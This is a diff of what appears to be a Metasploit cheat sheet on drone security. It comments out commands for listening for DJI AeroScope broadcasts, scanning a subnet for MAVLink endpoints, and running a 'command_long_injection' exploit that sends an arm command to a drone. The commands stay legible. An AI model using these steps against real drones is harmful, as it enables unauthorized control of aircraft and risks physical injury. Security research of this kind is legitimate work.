@@ -1408,23 +1408,23 @@ msf > show options
 
 # Auxiliary scanners — passive discovery
 msf > use auxiliary/scanner/dji/aeroscope_listener
-msf auxiliary(aeroscope_listener) > set INTERFACE wlan0mon
-msf auxiliary(aeroscope_listener) > set DURATION 300
-msf auxiliary(aeroscope_listener) > run
+# msf auxiliary(aeroscope_listener) > set INTERFACE wlan0mon
+# msf auxiliary(aeroscope_listener) > set DURATION 300
+# msf auxiliary(aeroscope_listener) > run
 
 msf > use auxiliary/scanner/mavlink/heartbeat_scanner
-msf auxiliary(heartbeat_scanner) > set RHOSTS 192.168.1.0/24
-msf auxiliary(heartbeat_scanner) > set RPORT 14550
-msf auxiliary(heartbeat_scanner) > set THREADS 50
-msf auxiliary(heartbeat_scanner) > run
+# msf auxiliary(heartbeat_scanner) > set RHOSTS 192.168.1.0/24
+# msf auxiliary(heartbeat_scanner) > set RPORT 14550
+# msf auxiliary(heartbeat_scanner) > set THREADS 50
+# msf auxiliary(heartbeat_scanner) > run
 
 # Active MAVLink exploitation
 msf > use exploit/multi/mavlink/command_long_injection
-msf exploit(command_long_injection) > set RHOST 192.168.1.100
-msf exploit(command_long_injection) > set COMMAND 400  # MAV_CMD_COMPONENT_ARM_DISARM
-msf exploit(command_long_injection) > set PARAM1 1     # ARM
-msf exploit(command_long_injection) > set SYSID 255
-msf exploit(command_long_injection) > exploit
+# msf exploit(command_long_injection) > set RHOST 192.168.1.100
+# msf exploit(command_long_injection) > set COMMAND 400  # MAV_CMD_COMPONENT_ARM_DISARM
+# msf exploit(command_long_injection) > set PARAM1 1     # ARM
+# msf exploit(command_long_injection) > set SYSID 255
+# msf exploit(command_long_injection) > exploit
 
 # DJI drone modules
 msf > use auxiliary/scanner/dji/firmware_version
@@ -1440,7 +1440,7 @@ msf > services
 
 # 2. Identify MAVLink endpoints
 msf > use auxiliary/scanner/mavlink/heartbeat_scanner
-msf auxiliary(heartbeat_scanner) > run
+# msf auxiliary(heartbeat_scanner) > run
 # Database now contains discovered MAVLink hosts
 
 # 3. Pivot to active exploitation
